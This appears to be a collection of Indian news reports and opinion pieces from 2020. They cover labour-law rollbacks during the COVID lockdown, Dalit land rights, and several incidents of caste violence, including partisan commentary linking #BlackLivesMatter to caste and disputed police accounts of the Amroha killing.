Dearness allowance has been frozen for central government and PSU employees. The state governments and the private-sector industrial units have also followed suit. Mass retrenchments are being announced. The Uttar Pradesh government led by Chief Minister Yogi Adityanath has suspended application of all but a few ornamental state labour laws for three years. In fact, it was forced to withdraw a particular notification that sought to put in place a 12-hour workday. All inherent rights of workers earned through militant struggles and innumerable sacrifices and guaranteed by the Constitution – 8-hour workdays, minimum wage, Employees’ State Insurance, Provident Fund, gratuity, grievance redressal and conciliation mechanism of labour departments and labour courts, system of inspection, right to form union and recognition, regularization – stand abrogated at one stroke. Migrants take the long walk to their home states; Prime Minister Narendra Modi with his Japanese counterpart Shinzo Abe at a bullet train plant in Japan in 2016 The so-called ‘balanced’ changes in labour laws resorted to by the Madhya Pradesh government are no less brutal. It has offered a blanket exemption of application of crucial labour laws like the Industrial Disputes Act, Contract Labour Regulation and Abolition Act, and Factories Act. The conciliation machinery and inspection systems are being destroyed. Even private inspections are allowed. No labour law is applicable if companies employ less than 100 workers. Companies are assured of a licence in one day and are exempted from its renewal for 10 years. This could mean a repetition of Vizag-like gas leakages and other industrial accidents. “Profit over people” is the overriding mantra in all these changes. Gujarat is also following suit and has begun by sanctioning a 12-hour workday. Even state governments led by the Congress and other opposition parties governments don’t want to be left behind as evident in Rajasthan, Punjab and BJD-led Odisha. Karnataka and Tamil Nadu are seriously debating possible pro-industrialist amendments to the existing applicable labour laws. Karnataka went to the extent of cancelling trains meant to take migrant workers to their home states on the advice of the industrial and construction lobby. Chief Minister Yediyurappa, acting on a petition by the employers’ association, transferred his secretary of labour. Governments are becoming increasingly responsive to demands of industrialists while riding roughshod over workers’ interests. Prime Minister Modi has declared a 20 lakh crore package to revive the economy. But it has nothing to offer for scores of migrant labourers walking hundreds of kilometres to reach their homes, even though the migrant workers are said to constitute 40 percent of the total workforce. Crores of unorganized workers and even regular workers in majority of cases have been flatly refused the lockdown wages assured by Modi. This has been true of not just the MSME sector but also the big companies. The proposed rural package has nothing to say about guaranteeing work or wages under NREGA. It only talks about extending support to rural infrastructure to help rich farmers and kulaks. Poor agricultural labourers are not at all in the picture. Rather, NREGA allocations have been progressively being reduced. Creating massive unemployment is the strategy of the government to provide cheap labour to the corporates and to protect and increase their profits. The central government claims that by increasing the workday from 8 to 12 hours companies can operate with 50-65 percent workforce and meet the ‘social distancing’ requirements of reining in the epidemic. But this is nothing but a cunning strategy to secure the profits of corporate companies. By scrapping labour laws, the governments and the corporates hope to attract international capital from China, whose handling of the coronavirus epidemic has come under criticism. They do not understand that the capital also requires some regulation of working conditions to escape spontaneous outbursts of workers. Abrogation of labour rights and labour laws can only lead to anarchy, fuel dissent and intensify protests. In other words, the governments and the corporates are just daydreaming. Shankar V. is president, All India Central Council of Trade Unions (AICCTU). He has been associated with trade unions and working-class movements for more than 35 years The apathy of the union government towards the people in the margins during the lockdown imposed to control the spread of the coronavirus has been evident in both its inaction and actions – The Bhupesh Baghel government of Chhattisgarh believes that there are at least 51 spots in the state associated with Ram and plans to spend Rs 10 crore on developing nine of them.

1,"Published: 12th May 2020 Thendral Movement helps Dalit women get their own land through training programmes, counselling, documentation and legal support Dr P Vedhanayagi, Founder, Thendral Movement What am I really entitled to? For a Dalit woman, even in this day and age, this is a question that unfortunately, gives her sleepless nights. There's no denying that Dalit women are 'twice-alienated'. First, because of their caste, and second, because of their gender. In public society, she is oppressed by her upper-caste employers and she returns home only to be oppressed by the man or men in her home. With nothing to claim as her own and always having to live at the mercy of others, her very being is ignored and her voice is silenced. So could a piece of land registered to her name really change things around? Dr P Vedhanayagi, a Dalit activist and agro-feminist certainly believes so. In fact, the link between property ownership and civic rights has been clear throughout history, even dating back to ancient Rome where you could vote only if you owned land. While the Indian government has made attempts and provisions for women to own land, it is easier said than done. For instance, many Dalit women are not even aware of these provisions, and even if they are, they need to depend on others (mostly, their oppressors) to get access to it. So, in 2004, Vedhanayagi decided to start a collective in Ranipet, Vellore to help Dalit women own their own land. She named it the Thendral (breeze, in Tamil) Movement. As part of this initiative, more than 50,000 individual women and their families have benefitted through various programmes, counseling sessions, campaigns, seminars, training workshops, legal counselling and support. Explaining the importance of their work, Vedhanayagi says, ""Ownership of the land, even if it is just a cent, empowers Dalit women. Land ownership was earlier possible only for men and Dalit men either lost or sold it or got cheated. History has seen how Dalits have lost land ownership and became landless, resulting in them becoming powerless and without rights. Men are less ambitious to empower women and let women have the ownership over the land. Thus, Dalit women have to face several challenges in winning this process. Owning land for a Dalit woman is a herculian task, but our struggle continues."" Thendral Movement has also been fighting for the central and state governments to amend the Land Acquisition Act. The activists are calling for ownership of all waste lands to be given to women. Vedhanayagi believes that not only will this empower them, it will also help in developing these waste lands as women will work harder, a concept she calls Agro-feminism. She explains further, ""After ownership of the land, women will not have to go to other factories to work. They would produce, distribute, disperse and develop the entire society from hamlet to hamlet, village to village, Panchayat to Panchayat. Her life and the the lives of everyone around her could change."" And it all begins with owning land.

1,"Ahmedabad: Around eight Dalits were severely injured when a mob allegedly attacked them and 12 of their community members at Samter village near Una, while they were returning home after attending a protest rally in Una town of Gir Somnath district this evening. The incident took place around 5 PM. Police lobbed teargas shells to disperse the crowd and resorted to mild lathi-charge, even as the victims alleged that the force did “nothing to help” them. The victims also claimed that the attackers were residents of Samter village, who wanted to “avenge” the arrest of 12 persons in connection with last month’s Una Dalit flogging case. The 20 victims, who are from Bhavnagar district, had gone to Una on their motorcycles along with others. They were returning home after hoisting of a tricolour by Radhika Vemula, mother of Dalit scholar Rohith Vemula who had committed suicide in Hyderabad, and Balu Sarvaiya, father of one of the victims of Una Dalit flogging incident, in the presence of JNU student leader Kanhaiya Kumar. The mob stopped and attacked them at Samter, which falls on Una-Bhavnagar road and not far from Mota Samadhiyala village, where seven Dalits had been brutally beaten up by cow vigilantes last month. “Police fired tear gas shells to quell a violent mob at Samter this evening. When they refused to disperse, police also resorted to mild lathi-charge,” an official of Gir-Somnath police control room said. Mavjibhai Sarvaiya, who survived the attack, alleged they were attacked by residents of Samter village. “Out of the 30-odd persons arrested till date in the Una Dalit thrashing case, 12 persons belong to Samter, which is 11 km from Una. Around 200 Dalits, including me, had come to Una on our bikes to attend the rally. When we were returning, Samter residents blocked the road and thrashed us mercilessly,” he said. “Though the police force was there, they were outnumbered by attackers, who are holding us responsible for the arrests of 12 of their men. At least 20 persons were injured and eight of them received grievous injuries. The injured have been admitted to hospitals in Bhavnagar and Rajula. One of our bikes was also set ablaze,” Sarvaiya said. He alleged that police did not help them during the time of the attack. “It was a pre-planned attack, as all the alternate roads were also blocked by them. We were attacked in the presence of police. When the situation went out of control, the police fired some tear gas shells on the mob,” alleged Sarvaiya. Despite repeated attempts, no senior police officials were available for comment. © 2021 NEWSNATION. ALL RIGHT RESERVED."

1,"Around 10 houses of Dalit families were set on fire after a clash with Muslims at Batheti village in Jaunpur district of Uttar Pradesh on Tuesday night, leading to tension in the area. By Wednesday evening, police had arrested 37 of the 57 named in the FIR lodged on a complaint filed by Dalit community. While additional police force has been deployed in the village, the district administration has removed the Station House Officer of Sarai Khwaja Police Station, Sanjiv Mishra, and sent him to Police Lines. According to police, the clashes erupted after two groups of Dalit and Muslim boys had an altercation over cattle grazing. “On Tuesday evening, some Dalit and Muslim teenagers were grazing buffaloes and goats when they started quarreling. Initially, the village head intervened, but later, some boys from the Muslim community returned to the Dalit basti where a Dalit man slapped a Muslim boy, and the matter got escalated… There was stone-pelting from both sides and people alleged that firearms were used. Eleven boys from both the communities were injured in the stone-pelting. Later, a group of Muslim men indulged in arson and set fire to Dalit huts,” Mishra, the outgoing SHO, told The Indian Express before he was shuntedout. Also Read | 20-year-old Dalit man ‘chased, beaten to death over inter-caste relationship with woman In the police complaint filed by the Dalit families, it was alleged that the fight began after the Muslim boys hurled casteist slurs at them. “When this was opposed, they started beating up my cousins… When some family members, including mothers of my cousins, went to inquire about the incident to the house of the accused, they had to face abuses… Around 6 pm, 57 identified and 20-25 unidentified people from the Muslim community came to our basti with sticks and weapons threatened to kill us… Women and children had to take shelter in the nearby village and 10 houses were burnt by the Muslims,” the complainant told the police.

1,"It was only a matter of time before the super-intellectual celebrities of Bollywood came out with their own version of #BlackLivesMatter and tarnish a campaign that has started over 8,000 miles away in America to end racism. The hypocritical celebs of Bollywood who are money chasers at best and clout-chasers at their worst have started trending the hashtag in the obvious coordinated fashion that has become customary of the entire brigade. The PR agencies of Bollywood have devised their own strategy with the obvious backing of left-liberals to unleash the propaganda in India now. They have included Dalits, Muslims, women and migrants, all in the same campaign which makes absolutely no sense. We have already seen how the left ecosystem has hijacked the movement in America where violent demonstrations, looting, sheer vandalism, and arson is being justified in the name of protests. The eerie similarities between Indians left-liberals and American left-liberals is difficult to ignore. (Read: Shaheen Bagh, NE Delhi riots) Celebs like Kiara Advani, Huma Qureshi, Ileana D’Cruz have started putting up stories as part of their hobby—social activism on social media platforms. It does not take much to figure out that these celebs have been well paid to put up these posts because let’s be honest we all have a rough estimate of the IQ of such celebrities. Ohh, so campaign amount has arrived. pic.twitter.com/E0mUnP0C9M — Manpu (@ipunamchoudhary) June 2, 2020  But somehow these celebs are the same people who tend to remain quietly nestled in their posh apartments of Mumbai when a few kilometers away in Palghar, two innocent Hindu Sadhus are lynched. The reason for their silence is pretty straight-forward—for the woke Bollywood, death of a Hindu sadhu does not bring the brownie points. But romanticizing the vandalism in West does. And more brownie points follow when you are somehow able to squeeze in the minorities in a campaign which is diametrically opposite of what these celebs want it to become. TFI had reported how the left-liberals were provoking the minorities of the country to mobilize and start impersonating the hoodlums of the US. Funnily enough, they equated the Blacks of America and the Muslims of the country in the same bracket. They are not the same but what is same is the ideals of left-wing which only thrives on anarchy. Nothing, absolutely nothing justifies violence of any kind when in the end those who will suffer are the ones being riled up to participate in violence. The celebs and left-wingers will stay in their high-rise homes and give sermons about how to take up arms to protest against ‘fascism’—a word the cabal likes to throw around to put weight behind their statements. Are they planning/provoking another set of riots? pic.twitter.com/ebPJLjThTm — Vasudha (@WordsSlay) June 1, 2020  While Bollywood stars speaking out against racism is indeed a welcome development, what cannot be ignored is their sheer hypocrisy, and even covert support towards both racism, as well as colorism. The curious case of the likes of Priyanka Chopra, Disha Patani, Deepika Padukone, Sonam Kapoor, and numerous others who endorse fairness creams on one side and in the same despicable breath upload a photo with the hashtag #BlackLivesMatter kind of makes us wonder what message they are trying to pass. Hypocrisy dies a thousand slow deaths when these celebs take such high moral ground. List of Indian actors who are speaking on BLM and their fairness cream ads, a thread : pic.twitter.com/yUeRNLch6U — anti pigeon (@aluminiummaiden) May 31, 2020  Kangana Ranaut who is often at the receiving end of hate from left-liberals because of her views which are distinctively different from the typical hypocritical Bollywood artists tore apart the woke-celebs who were trying to draw parallels between the death of George Floyd and alleged ignoring of injustices in India. “The Sadhu lynching happened a couple of weeks ago; still no one said a word. It happened in Maharashtra where most of these celebrities reside…Bollywood anyway is a derived name from Hollywood. It is a shame they [Bollywood celebrities] continue to live in a bubble and never fail to jump on the bandwagon, which can give them two minutes of fame, but ‘white people’ must drive the bandwagon. Perhaps, it is because of their pre-independence colonial slavery genes.” said Kangana to HT, absolutely lashing the so-called good Samaritans of Bollywood. The left-liberals by including Dalits and Muslims want to pursue another bout of protests and vandalism, with the endgame to break down the entire state machinery. The buildup has started and more foolish Bollywood celebs are sure to join the bandwagon, keep an eye out. Wine, Books, Movies - In that order Your email address will not be published.

1,"In the aftermath of communal clash in Jaunpur, many Dalit victims have come forward to recount their ordeal and the atrocities meted out by the Muslims against them Dalit colony in Bhadethi village in Jaunpur district of Uttar Pradesh was engulfed with raging conflagration on June 9 as Muslims in the region launched an attack against the Dalit settlements. At least 35 people, including Samajwadi Party leader Javed Siddiqui, have been arrested in connection with setting ablaze the houses of Dalits in the Dalit Basti in a Jaunpur village. In the aftermath of the dreadful incident, many Dalit victims have come forward to recount their ordeal and the atrocities meted out by the Muslims against them. A video of one of the victims, Pooja, narrating her tribulations is doing the rounds on the social media. Giving an account of her suffering, Pooja said, “We were inside the house when the communal clashes broke out. When we locked ourselves in, manic Muslim crowd started pounding the gates to barge in. They hurled brickbats and stones at the gate. Shots were fired outside. As we remained inside the house, the frenzied Muslim mob set the house on fire from all sides.” #Jaunpur सुनिए इस लड़की की जुवानी कैसे मुसलमानों ने दलितों को जिंदा जलाने की कोशिश की।उनके रुपया,जेवर सब लूट लिया।500से ज्यादा मुसलमानों ने दलितों के ऊपर हमला किया और पूरी बस्ती जला दी मेवात में मुस्लिमों ने दलितों के साथ क्या किया ये छुपा नही है।@BhimArmyChief @Mayawati pic.twitter.com/ZCOKC4kFj4 Pooja said they were so scared of the rampaging mob that they remained hidden in the burning house until the rabble-rousers left the spot. Soon after the mob departed from the area, she, along with others somehow escaped the blazing house and hightailed it to a nearby village. They spent the night in the neighbouring fearing persecution at the hands of the Muslim mob on return. She further added, “We are too scared because they were in huge numbers. Approximately 500-1000 of them had attacked us. Initially, they attacked us with batons. After that, stones and brickbats were hurled at us. Then, the bullets were fired. They looted all of us. Shops were ransacked, jewellery was stolen, whatever valuable we had, they took everything away.” A minor argument among the children turned into a deadly communal clash in a village of Jaunpur, that led the destruction of more than a dozen houses that were owned by Dalits after they were was set blazed. Massive damage was caused to the scheduled caste community. Even the domesticated animals were not spared. Reportedly, three goats and one buffalo were burned alive. According to the reports, a boy named Shehbaz in the village reportedly had an altercation with the children of Dalit colony regarding grazing of the goats. The altercation led to a ruckus between the members of the two communities. However, as soon as the dusk descended, members of Muslim community launched an attack against the Dalits. Around 8 pm, some 100 people from the other village raided the Dalit locality again and attacked the locals in which three Dalit men- Ravi, Atul, and Pawan were injured. The assailants started burning the houses. Many people including Nandlal, Nebulal, Rajaram, Jitendra, Sewlal lost their belongings along with their shelters. UP CM Yogi Adityanath took cognizance of the incident and ordered the police officials to invoke the Gangster Act and slam NSA on the culprits- Noor Alam and Javed Siddiqui. The CM also called for strict action against the SHO of the local police station as he failed to control the situation. Whether NDTV or 'The Wire', they never have to worry about funds.

1,"Dalit Teenager Shot Dead in UP, While We Tweet On #BlackLivesMatter By Arré Bench Jun. 09, 2020 The Black Lives Matter movement has seen enthusiastic support back home, with a number of Indians taking to social media to show support for the protests in the USA. However, a recent headline about a Dalit teenager who was shot dead for allegedly praying at a temple, doesn’t seem to have earned the same show of solidarity. From @DishPatani to @priyankachopra to Google CEO @sundarpichai, all have spoken up in support of #BlackLivesMatter. Can we except such outrage from them when a Dalit is murdered in a hate crime, or when a lower caste woman is raped?https://t.co/R6ofPWv65I — Dilip Mandal (@Profdilipmandal) June 3, 2020  The teenager, named Vikas, was shot dead in an Uttar Pradesh village last night, five days after allegedly “defying objections” to him praying at a local temple. A member of an influential upper-caste family, Horam, has been accused of his murder. This is where we are. Shooting a Dalit boy dead because he prayed at a temple. In a state that’s ruled by a man who wears saffron and calls himself yogi. Because in the Hindu fascist state, caste and untouchability are inbuilt mechanisms. https://t.co/fDaFIYStsw — meena kandasamy || இளவேனில் மீனா கந்தசாமி (@meenakandasamy) June 8, 2020  The police said the incident was the outcome of a quarrel, but have booked the accused under the Scheduled Caste and Scheduled Tribes (Prevention of Atrocities) Act, among others, indicating that the teenager’s caste had something to do with the incident. The fact that this shocking headline was met largely with silence online, while conversation over the BLM movement continues to gain steam, meanwhile, has irked a number of social media users back home, who asked where all the outrage had gone. One cynically noted that there wouldn’t be any, because “Dalit lives don’t matter”. A Dalit boy my age was shot dead in Uttar Pradesh for entering a temple. Where’s the outrage? Where’s the petitions? Where’s the anger? There’s isn’t any, because Dalit lives don’t matter. — Sankul (@s3nkul) June 8, 2020  Another urged those tweeting about BLM to stop with their “performative wokeness” since it was clear the lives of Dalit men and women didn’t seem to matter. All the BLM solidarity folks of India are very silent about the murder of a 17-year-old Dalit boy. Just stop with your performative wokeness already. — Didi Dialectic 🌱🌈🌻 (@anuxiety_) June 8, 2020  A few even connected it to the death of an elephant last week — news of which had been shared widely and met with strong condemnation — and asked why social media wasn’t extending the same courtesy to this latest incident of caste violence. Celebs not pouring their heart out on Dalit kids Vikas Jatav and Devika. Do they think Dalit lives deserves brutality and Elephant doesn’t ? We see no outrage anywhere. Hypocrisy. Silence is violence too — urbanomed🏳️‍🌈 (@udhan_khatola) June 9, 2020  Neeraj Ghaywan, the National Award-winning director of Masaan, said the silence was proof that our country was a century away from “taking a knee”. He was referring to American football player Colin Kaepernick’s now iconic act of kneeling during the country’s national anthem in protest against police brutality. Forget reparations and apologies for centuries of caste violence, we are still stuck at not allowing entry to Dalits in temples! No reportage! No outrage! I feel stupid typing #DalitLivesMatter. Because they fucking don’t. We’re a whole century away from ‘taking a knee’. — Neeraj Ghaywan (@ghaywan) June 8, 2020  The father of the teen who was killed in UP, meanwhile, told reporters that Vikas was beaten up by locals a week earlier, after a visit to the temple. But the police had refused to file an FIR then. A few days later, on Saturday night, Vikas was pulled out of his home by four men while he was sleeping and shot with a revolver. As the outrage over the murder now begins to pick up steam, maybe some of the celebrities fighting for the rights of minorities in America will extend the fight to minorities back home as well. Although given our history of ignoring caste violence, that might be a little too hopeful. Arré Bench The Arré bench delivers stories that mattress. It hasn't achieved much sofar. But it's getting bedder.  Did you like it? Tell us what you think so we can give you more content you like : There are a slew of Instagram accounts run by media professionals dedicated to irritants and inside jokes of their job and industry. Lately, the conversation has slowly moved from the likes of “This client said this silly thing” to “My agency promotes mental health as long as it involves a yoga class, not reasonable work hours or manageable workloads. Haha. Fun.” This shift from LOLs and low-key whining to simmering aggression about toxic work culture during the pandemic is an eye-opener. We’ve all heard of Javed Khan, the rickshaw driver who sold his wife’s jewellery to convert his vehicle into a mobile ambulance. Though heartening, these tales of sacrifices make me gloomy. Each one of these positive stories come with the unsaid failure by the state or those in a better position to help. As the second wave continues to batter India, “woke” media organisations and ad agencies are all about well-being and mental health. The problem arises when this performance of empathy does not extend to their employees. Stories of bosses expecting you to work beyond office hours and making one demand after another on WhatsApp groups are all too common. There are several reasons why this second wave of the coronavirus may prove to be more lethal than the first one. Most of it has to do with Indian behavioural impulses. Indians haven’t been able to stand in a queue for the longest of time and it comes as no surprise that the pandemic-taught etiquette has worn off. In Dwarka, a man was so angry with his mother for getting into an argument with a neighbour that he slapped her in public. She died. Her death should be seen as the moment we call out the many abusive relationships the elderly live in, with death as their only escape.

The police stated that both the parties were caught in a dispute of ₹ 5000 over land issues. Further investigation is on in this matter.

The reports quoted the victim’s father’s claims that the boy got into an altercation with some ‘upper caste’ youth in the village over entering the temple. The Wire, too, reported the story. However, that is not true. Amroha Police has clarified the above unfortunate incident had nothing to do with caste bias but it was an internal fight over a sum of Rs 5,000. ग्राम डोमखेडा थाना हसनपुर, अमरोहा मे घटना के सम्बन्ध मे पुलिस द्वारा शीघ्र कार्यवाही कर 03 अभियुक्तो को गिरफ्तार कर जेल भेजा गया। दोनो पक्षो के मध्य बाग की बटाई के 5000 रुपये को लेकर विवाद होना विवेचना में पाया गया । पीडित पक्ष की आर्थिक व अन्य साहयता हेतु कार्यवाही की जा रही है। Police has ruled out caste dispute as cause of murder. As per police, 3 men have already been arrested in the case. The police stated that both the parties were caught in a dispute of ₹ 5000 over land issues. Further investigation is on in this matter. Superintendent of Police, Amroha police station, Vipin Tada, also clarified that the dispute was over Rs 5,000. @amrohapoliceथाना हसनपुर क्षेत्रान्तर्गत ग्राम डोमखेड़ा में नाबालिग युवक की हत्या करने के सम्बन्ध में पुलिस अधीक्षक अमरोहा डॉ0 विपिन ताडा द्वारा दी गयी बाइट @Uppolice @CMOfficeUP @dgpup @adgzonebareilly @digmoradabad @bstvlive @ZEEUPUK @News18HindiUP pic.twitter.com/taRo6E0SNH The police officer said that the victim had partnership with the perpetrators of managing mango field and honeybee breeding.

1,"NEWS Ira Shukla Disclaimer: This article contains videos of violence and abuse. Since the beginning of the 'Black Lives Matter' protests, many other narratives have sprung up, with people opting to say 'All Lives Matter' to bring every human in the conversation. This includes our own celebrities. While it is fundamentally a correct statement, the timing of it is not. At a time when people from African-American communities are fighting against centuries of injustice, saying 'all' lives matter, takes away from their struggle and changes the narrative for worse. Sara Ali Khan posted this pic on her insta which say ""all lives matter"" striking the word ""black"" on the post. I know our Indian celebrities were stup!d but this is peak [email protected], I have no words. #BlackLivesMatter pic.twitter.com/skQD4w3QHk *In picture is Sara Ali Khan's post, which she deleted later* Which begs us to view this in light of issues in our own country. In a grim reminder that caste discrimination still exists, there have been multiple cases of Dalit people being demeaned and in worst of cases, killed, in India. Why are people not talking about these issues, is the question that needs to be answered. A 17-year-old Dalit boy was shot dead by four men in UP for trying to enter a temple. The outrage should be over flowing, but there’s barely a trickle. 1. A 17-year-old boy, Vikas, killed by a group of 'upper caste' people allegedly for entering a local temple in Amroha. Vikas' father told The Telegraph that the accused tried to stop the boy, but he entered the temple to offer prayers. Later, they came to his house and shot him with a gun. He also said that the police refused to file an FIR intially. Meanwhile, the officer in charge of the local police station, Niraj Kumar said that it wasn't a matter of untouchability, but other issues between the boy and the group. Some accused in the matter have been arrested while the search for the others is on. 2. A 20-year-old Dalit man, Viraj, chased down and beaten down to death for alleged relationship with an 'upper caste' woman. The incident happened in Pune's Pimple Saudagar, where the girl's father, along with other family members, chased down the man in a tempo, hit his two-wheeler from behind and thrashed him with a metal rod and a rock. He succumbed to injuries later. The girl's family, on the other hand, accused Viraj of harassment and stalking. The police has arrested the accused and detained 2 minors. 3. Dalit men in UP beaten, shaved and paraded around with shoes around their necks for stealing a fan from the house of a 'Brahmin man'. The incident happened on June 4, after the 3 men allegedly stole the fan. The PGI police station in-charge, KK Mishra, elaborated on the issue and told The Quint: Cases were registered against both, the men and the people who subjected them to humiliation. योगी का रामराज्य दलितों के लिए कब्रगाह है। यूपी के लखनऊ, पीजीआई थाना क्षेत्र में ब्राह्मणवादियों ने ऊना कांड को दोहराया है।21वीं सदी में भी मनुस्मृति का दंभ पाले ये लोग सत्ता के नशे में मदमस्त हैं। घटना स्थल पर भीम आर्मी की टीम पहुंची है। याद रहे.. एक दिन यह सरकार भी बदलेगी। pic.twitter.com/eRd4XYF6GC 4. 2 Dalit men, were beaten with rubber belts, violated for alleged crime of stealing money in Rajasthan. The 2 men went to a servicing shop in Rajasthan’s Nagaur district on February 16. It was then that one of them was stopped on the counter and accused of stealing money. He was then beaten up by several people at the servicing center, who also violated him with a screwdriver dipped in petrol. When the other tried to help, he was thrashed too. The manager of the servicing center later filed an FIR against the two men, saying that they had stolen money from the shop. The police did not recover any cash from them. 7 people were arrested in the case after huge uproar. 5. An 'upper caste' man allegedly murdered a Dalit woman and consumed pesticide afterwards, in an attempt to commit suicide. The incident was reported by The Indian Express on May 19, 2020. According the her husband, the 27-year-old was walking to a field with two other women. It was then that an 'upper caste' man came and held her hand, when she tried to resist, he hit her with the handle of a shovel. She died immediately. The Superintendent of Police of Rajkot, rural police Balram Meena, later said that they could not confirm if the accused was trying to physically assault her or that this was a case of class divide. 6. Dalits stopped from cremating an old woman's body at a public crematorium by people from Jat community in Rajkot. In a case from January 2020, a Dalit family was stopped from cremating an old woman's body and they had to sit on a protest for any action to be taken. Later, they were allowed to cremate the body, but on the ground, unlike in other cases where it happens on a platform with a tin shed. The FIR was registered 4 days after the incident. 7. 3 men forced a Dalit man forced to eat human excreta, urinated on him over between the communities. A 43-year-old man was forced to eat human feces and was urinated on by caste Hindus in Thirumandurai village of Thiruvarur district. In his complaint, he said that 3 men attacked him when he was coming back from a brick kiln and then subjected him to humiliation over a fight that started between the communities over a temple festival 3 years ago. Arrests were made, based on his complaints. This incident happened in 2019 and led to a lot of furore from various sections of the society. Now these are just cases that have been reported/made it to the news. The fact that a lot of people don't even report these cases out of fear, shouldn't come as a surprise. As someone who says 'all' lives matter, why are they not talking about these issues? Do these not make the cut? Are they so irrelevant that they don't just not get a name of their own, but also don't fit in the word 'all'? Is this not ignoring the entire existence of the people of these communities?"
1,"Everything is Written Here Seventeen-year-old Dalit boy was shot dead in an Uttar Pradesh village on Saturday night five days after he had prayed at a local temple defying upper-caste objections, The Telegraph reported. Vikas Kumar Jatav was shot by four youths from an upper caste family at his home, his father Om Prakash Jatav told reporters on Sunday. The boy shot dead died from a bullet wound to the chest, Dainik Jagran reported. Jatav, a farmer told media that his son had on June 1 visited a Shiv temple at their village of Domkhera in Amroha district in Uttar Pradesh. “Some people, including Horam Chauhan, a youth from an affluent upper-caste family, tried to stop my son from entering the temple on the ground of his Jatav identity. But Vikar ignored them and offered prayers there,” Om Prakash said. After Vikas had finished praying, several upper-caste villagers thrashed him. Vikas’s family approached the police at the time but the police refused to register an FIR. “On Saturday night, Horam and three other youths from his family arrived at our home and dragged Vikas out. One of them shot him with a revolver and they all ran away,” father said. Police denying casteism According to The Telegraph report, Niraj Kumar, an officer in charge of the local police station, said the primary investigation didn’t suggest any dispute relating to a temple or untouchability. “Our investigation suggests the victim, the killer, and other youths were playing in a field seven days ago when a fight broke out between them,” he said. “We have registered a case against four people from a family on the basis of the father’s complaint and are investigating,” Vipin Tada, Amroha superintendent of police, said. The accused have been charged with murder and violation of the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act. Govt should take strict action: Mayawati Former Uttar Pradesh chief minister Mayawati has demanded strict action against the culprits behind the murder of Dalit youth. “The persecution of Dalits, especially during the Corona epidemic, is still continuing. The latest example being the incident of Domkheda village of Amroha in UP where some feudal elements brutally murdered a Dalit. The government should take strict action against the culprits and provide justice to the victim’s family and help them fully,” BSP chief said in a Twitter. 2. कोरोना महामारी के दौरान खासकर दलितों के ऊपर उत्पीड़न अभी भी जारी है, जिसका ताजा उदाहरण यूपी के अमरोहा के गांव डोमखेड़ा की घटना है जहाँ कुछ सामन्ती तत्वों ने एक दलित की निर्मम हत्या कर दी। सरकार दोषियों पर सख्त कार्रवाई करके पीड़ित परिवार को न्याय दे व उनकी पूरी मदद करे। BSP MP Kunwar Danish Ali, former BSP district president Hem Singh Arya, former BSP candidate Jaidev Singh from Naogaon Sadat assembly constituency and Ambedkar Vikas Manch president Mahendra Singh Arya visited Vikas’s home on Sunday. “So shocked and disturbed to see the killing of innocent Dalit youth from my constituency. Powerful people from the upper caste are not ready to rise above d feudal mindset. Killing a Dalit on the issue of entering a temple is a just game for them. Culprits must be punished! ,” Danish Ali said. So shocked n disturbed to see killing of innocent Dalit youth from my constituency.

1,"The death of Nawaraj BK, Ganesh Budha, Sandip BK, Lokendra Sunar, Tikaram Sunar and Govinda Sahi in Rukum has once again highlighted the tragic stories of caste-based discrimination in Nepal. Along with what happened in Rukum, the story of 13-year old Angira Pasi, a young girl who was raped, then married to her rapist and found dead the next day has shocked millions. Their stories along with the many murders and violence against people due to caste based discrimination has led to many calling for more support and justice for the Dalit community. George Floyds death has sparked Black Lives Matter protests across America and the world and many Nepalese people are also having the much needed conversation around racism in Nepalese society and caste-based discrimination. The tragic stories from Rukum and Rupandehi came in the final week of May and along with Black Lives Matter, we are seeing a huge outpour of outrage online and offline with #DalitLivesMatterNepal becoming a commonly used hashtag. Taking inspiration from other websites, I have decided to list the different ways you can support Dalit lives to ensure that they get justice and for us to educate one another and challenge assumptions of family members and wider society. There is a lot of unlearning and learning that we need to go through as a society and whilst it may be uncomfortable; we need to do this. Here are the different ways you can help: The Word Dalit – further reading One of the most important things you can do is to educate yourself on why this continues to happen… I might not be able to change the mindset of people in Rukum but I know that caste-based discrimination is rife within the Nepalese communities in the UK. I know of the challenges that people my age face in marrying the ones they love, whether they be Gurung, Thakuri, Limbu or Shrestha. There’s huge discrimination that continues to take place and we can start by having these difficult conversation with ourselves and with our loved ones. The more we learn about ourselves, we’ll find out what we want to speak up for and what we stand for. That can be the beginning for many…. and please, keep an eye on the news websites, social media, ask your favourite influencers to read about this, ask for their views and for them to also share widely. I worry that this too will slowly fade away, as often many things do… but I hope you also keep tabs on me and continue to remind me because we all know that caste-based discrimination is not something we can change overnight – we need to be persistent.

1," On 27 May, Arvind Bansod, a Dalit social activist and a resident of Pimpaldhara village in Maharasthra’s Nagpur district died amid suspicious circumstances. According to Soniya Gajbhiye, a Nagpur based lawyer who is representing his family, Bansod was murdered by a group of men after they abused him with casteist slurs. The incident took place under the jurisdiction of the police station in Jalalkheda, a town in the Nagpur district. However, the Jalalkheda police initially treated the case as a suicide. I spoke to Gajanan Raut, Bansod’s friend who was with him shortly before his death. Raut recounted the events of 27 May. “Arvind bhai and I were going to an ATM to withdraw money,” he said. “There is a village named Thadipawani at a distance of five kilometres. On the way, we met a woman who asked if we can book a gas cylinder for her. Arvind bhai agreed but we did not have the number. So, when we reached Thadipawani, I clicked pictures of the banner at a gas agency.” Raut said that a worker at the agency objected to him taking photos of the banner and snatched his phone. Bansod and Raut then walked into the gas agency’s office to ask for the phone to be returned. Mithilesh Umarkar, also known as Mayur, the owner of the gas agency, was seated in the office. Describing Mithilesh’s exchange with Bansod, Raut added, “Mayur said, ‘So you are Arvind Bansod. I have heard a lot about you. Now I finally met you.’ Arvind bhai told him to return the mobile.” According to Raut, Mithilesh then began to address Bansod using casteist slurs. “He told Arvind bhaiya, ‘You are from Mahar caste. Do you want to become a leader? Let me see how. You don’t have the status,’” Raut said. Bansod continued to insist on getting Raut’s phone back. According to Raut, Mithilesh subsequently asked three friends, who were present in the office, to beat up the two of them. Raut said the abuses and beating continued for over half an hour. After they left the office, Raut asked Bansod to let the matter go. He then left the area to refill petrol on their vehicle. “I returned in a short while and saw him lying fallen down at the agency,” Raut said. He added that there was a bottle containing a poisonous substance lying nearby. According to the version of the Jalalkheda police, in the interval when Raut was absent, Bansod purchased a bottle of pesticide from a nearby shop and consumed it—a narrative strongly disputed by Raut and Bansod’s family. Continuing his account, Raut told me that Mithilesh and his friends took Bansod in their vehicle, while refusing to let Raut join them. “I asked the man who took my mobile as to where he was being taken. He said they were taking him to the hospital. I returned to the village and informed his elder brother about what happened,” Raut said. Subsequently, Raut, along with two of 